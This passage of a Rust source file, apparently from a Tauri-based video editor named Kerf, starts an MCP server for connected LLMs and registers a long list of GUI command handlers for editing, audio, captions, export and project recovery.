            spawn_reveal_failsafe(app.handle().clone(), main_window_shown, REVEAL_FAILSAFE);

            // The app *is* the MCP server: host the tools over HTTP, sharing the
            // same Project the GUI edits, so a connected LLM works on the open
            // project and its edits show up live.
            mcp::start(shell::Shell::Gui(app.handle().clone()), project);
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            commands::library::list_assets,
            commands::library::list_fonts,
            commands::library::get_timeline,
            commands::library::get_asset_metadata,
            commands::library::asset_files,
            commands::project::project_path,
            commands::project::new_project,
            commands::project::open_project,
            commands::project::save_project_as,
            commands::project::recent_projects,
            commands::project::open_recent,
            commands::project::clear_recent_projects,
            commands::library::remove_asset,
            commands::library::relink_asset,
            commands::library::check_relink,
            commands::library::missing_assets,
            commands::library::search_transcripts,
            commands::library::paths_exist,
            commands::analysis::import_asset,
            commands::analysis::cancel_import,
            commands::analysis::analyze_asset,
            commands::analysis::analysis_statuses,
            commands::analysis::proxy_statuses,
            commands::analysis::rebuild_proxy,
            commands::analysis::delete_proxy,
            commands::analysis::get_proxy_queue,
            commands::analysis::fast_gpu_status,
            commands::analysis::prioritize_proxy,
            commands::analysis::cancel_proxy,
            commands::analysis::cancel_proxy_queue,
            commands::analysis::pause_proxy_queue,
            commands::analysis::resume_proxy_queue,
            commands::analysis::transcription_status,
            commands::analysis::set_speech_model,
            commands::analysis::download_speech_model,
            commands::analysis::cancel_model_download,
            commands::voiceover::voiceover_status,
            commands::voiceover::prepare_voiceover,
            commands::voiceover::generate_voiceover,
            commands::voiceover::cancel_voiceover,
            commands::music::music_status,
            commands::music::prepare_music,
            commands::music::compose_music,
            commands::music::cancel_music,
            commands::sound_effects::sfx_catalogue,
            commands::sound_effects::preview_sound_effect,
            commands::sound_effects::add_sound_effects,
            commands::sound_effects::update_sound_effect,
            commands::sound_effects::suggest_sound_effects,
            commands::sound_effects::get_band_balance,
            commands::sound_effects::cancel_band_balance,
            commands::editing::get_ripple_mode,
            commands::editing::set_ripple_mode,
            commands::editing::cut_clip,
            commands::editing::add_clip,
            commands::editing::split_clip,
            commands::editing::trim_clip,
            commands::editing::reorder_clip,
            commands::editing::move_clip,
            commands::editing::move_clips,
            commands::editing::ripple_delete,
            commands::editing::cut_clip_range,
            commands::editing::roll_edit,
            commands::editing::slip_clip,
            commands::editing::slide_clip,
            commands::editing::split_remove,
            commands::editing::split_remove_clips,
            commands::editing::split_all_tracks,
            commands::editing::lift_range,
            commands::editing::extract_range,
            commands::editing::ripple_delete_gap,
            commands::editing::apply_edits,
            commands::editing::add_track,
            commands::editing::remove_track,
            commands::editing::set_track_duck,
            commands::editing::set_track_volume,
            commands::editing::set_track_pan,
            commands::editing::set_master_volume,
            commands::editing::set_master_limiter,
            commands::editing::set_master_duck,
            commands::editing::set_master_true_peak,
            commands::motion_templates::plan_music_fit,
            commands::motion_templates::fit_music,
            commands::sound_effects::stems_status,
            commands::sound_effects::separate_stems,
            commands::sound_effects::cancel_stems,
            commands::editing::get_levels,
            commands::editing::cancel_levels,
            commands::editing::set_delivery_format,
            commands::editing::set_track_muted,
            commands::editing::set_track_solo,
            commands::editing::set_track_locked,
            commands::editing::set_clip_enabled,
            commands::linked_av::duplicate_clips,
            commands::linked_av::insert_clips,
            commands::linked_av::remove_clip,
            commands::linked_av::remove_clips,
            commands::linked_av::set_volume,
            commands::linked_av::set_fade,
            commands::linked_av::set_speed,
            commands::linked_av::set_speed_ramp,
            commands::linked_av::set_transform,
            commands::linked_av::set_transform_at,
            commands::linked_av::set_color,
            commands::linked_av::set_transition,
            commands::linked_av::set_mask,
            commands::linked_av::set_blend_mode,
            commands::linked_av::set_grade,
            commands::linked_av::inspect_lut,
            commands::linked_av::set_video_effects,
            commands::linked_av::set_audio_effects,
            commands::linked_av::set_keyframes,
            commands::linked_av::add_keyframe,
            commands::linked_av::set_keyframe_easing,
            commands::linked_av::set_property_keyframes,
            commands::linked_av::set_property_tracks,
            commands::linked_av::copy_keyframes,
            commands::linked_av::apply_motion_preset,
            commands::linked_av::list_motion_presets,
            commands::linked_av::set_behaviors,
            commands::linked_av::bake_behaviors,
            commands::linked_av::clear_keyframes,
            commands::linked_av::set_reframe,
            commands::linked_av::set_asset_projection,
            commands::linked_av::edit_asset_tags,
            commands::linked_av::list_tags,
            commands::linked_av::assemble_by_tag,
            commands::linked_av::clear_reframe,
            commands::linked_av::set_reframe_keyframes,
            commands::linked_av::add_reframe_keyframe,
            commands::linked_av::add_marker,
            commands::linked_av::update_marker,
            commands::linked_av::remove_marker,
            commands::linked_av::add_overlay,
            commands::linked_av::update_overlay,
            commands::linked_av::remove_overlay,
            commands::linked_av::set_overlay_keyframes,
            commands::linked_av::add_svg_overlay,
            commands::linked_av::update_svg_overlay,
            commands::linked_av::remove_svg_overlay,
            commands::linked_av::validate_svg,
            commands::linked_av::list_svg_presets,
            commands::linked_av::svg_preset_preview,
            commands::motion_templates::list_templates,
            commands::motion_templates::template_poster,
            commands::motion_templates::template_frames,
            commands::motion_templates::svg_element_ids,
            commands::motion_templates::template_image_value,
            commands::motion_templates::save_template,
            commands::motion_templates::apply_template,
            commands::motion_templates::apply_template_clip,
            commands::motion_templates::add_title_clip,
            commands::motion_templates::update_title_clip,
            commands::motion_templates::set_template_values,
            commands::motion_templates::set_title_text_box,
            commands::motion_templates::set_title_text_animation,
            commands::motion_templates::list_text_animation_presets,
            commands::motion_templates::list_text_animation_curves,
            commands::motion_templates::convert_title_text,
            commands::motion_templates::import_template,
            commands::motion_templates::export_template,
            commands::motion_templates::delete_template,
            commands::motion_templates::generate_captions,
            commands::motion_templates::cut_transcript,
            commands::motion_templates::clear_captions,
            commands::motion_templates::import_captions,
            commands::motion_templates::import_captions_text,
            commands::motion_templates::export_srt,
            commands::motion_templates::export_captions,
            commands::motion_templates::export_interchange,
            commands::motion_templates::export_markers,
            commands::motion_templates::refine_transcript,
            commands::motion_templates::remove_silence,
            commands::motion_templates::snap_to_beats,
            commands::export::smart_crop,
            commands::export::sync_clips_by_audio,
            commands::export::cancel_audio_sync,
            commands::motion_templates::extract_audio,
            commands::motion_templates::add_asset_audio,
            commands::linked_av::detach_audio,
            commands::linked_av::detach_audio_clips,
            commands::linked_av::reattach_audio,
            commands::linked_av::reattach_audio_clips,
            commands::linked_av::link_clips,
            commands::linked_av::unlink_clips,
            commands::motion_templates::concatenate,
            commands::review::get_history,
            commands::review::revision_diff,
            commands::review::get_staged_edit,
            commands::review::get_staged_timeline,
            commands::review::apply_staged_edit,
            commands::review::apply_staged_subset,
            commands::review::discard_staged_edit,
            commands::review::undo_staged_edit,
            commands::review::discarded_staged_edit,
            commands::review::restore_discarded_edits,
            commands::review::undo,
            commands::review::redo,
            commands::review::revert_to,
            commands::media::get_frame,
            commands::media::get_timeline_frame,
            commands::media::get_preview_frame,
            commands::media::set_preview_bounds,
            commands::media::gpu_preview_status,
            commands::media::playback_session,
            commands::media::start_playback,
            commands::media::start_asset_playback,
            commands::media::stop_playback,
            commands::media::get_waveform_range,
            commands::media::get_filmstrip,
            commands::media::get_audio,
            commands::media::get_energy,
            commands::tasks::list_tasks,
            commands::tasks::add_task,
            commands::tasks::resolve_task,
            commands::tasks::remove_task,
            commands::export::hw_encoders,
            commands::export::export_timeline,
            commands::export::export_variants,
            commands::export::cancel_export,
            commands::export::cancel_analysis,
            commands::export::export_cover,
            commands::export::cancel_cover_export,
            thumbnail_commands::set_thumbnail,
            thumbnail_commands::remove_thumbnail,
            thumbnail_commands::thumbnail_preview,
            thumbnail_commands::export_thumbnail,
            thumbnail_commands::suggest_thumbnail_frames,
            commands::export::cancel_smart_crop,
            commands::export::set_clip_stabilize,
            commands::export::analyze_clip_stabilization,
            commands::export::cancel_stabilization,
            commands::export::clip_stabilization_status,
            commands::export::get_scopes,
            get_render_bar,
            commands::export::platform_targets,
            commands::export::platform_check,
            commands::export::review_cut,
            commands::export::reveal_path,
            commands::app_settings::agent_status,
            mcp_commands::mcp_connection_info,
            mcp_commands::regenerate_mcp_token,
            mcp_commands::set_mcp_settings,
            commands::app_settings::report_ui_context,
            commands::app_settings::get_settings,
            commands::app_settings::set_settings,
            commands::app_settings::reset_settings,
            commands::app_settings::reveal_settings_file,
            commands::app_settings::read_text_file,
            commands::app_settings::write_text_file,
            reveal_logs,
            log_frontend,
            show_main_window,
            take_launch_project,
            recovery::list_recoveries,
            recovery::recover_project,
            recovery::discard_recovery,
            recovery::discard_recovery_at_exit,
            popout::popout_expect,
            popout::popout_cancel,
            popout::close_popout,
            popout::popout_focus,
            popout::popout_move
        ])
        .build(context())
        .expect("error while building Kerf")
        .run(|app, event| {
            // The logfile's last line then says whether the end was a clean exit
            // or a crash.
            if let tauri::RunEvent::Exit = event {
                recovery::on_exit(app);
                tracing::info!("kerf exiting");
            }
        });
}

#[cfg(test)]
mod tests;
